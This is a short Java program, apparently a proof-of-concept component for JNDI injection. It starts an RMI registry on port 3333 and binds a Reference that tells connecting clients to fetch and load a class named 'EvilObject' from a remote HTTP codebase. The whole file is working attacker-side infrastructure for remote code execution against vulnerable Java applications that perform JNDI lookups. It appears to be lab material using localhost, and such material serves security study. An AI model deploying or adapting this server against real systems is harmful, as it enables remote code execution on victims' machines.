import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class RMIService {
    public static void main(String args[]) throws Exception {
    	// RMI listening port
        Registry registry = LocateRegistry.createRegistry(3333);
        // where to fetch EvilObject.class
        Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:3333/refObj'");
        registry.bind("refObj", refObjWrapper);
    }
}
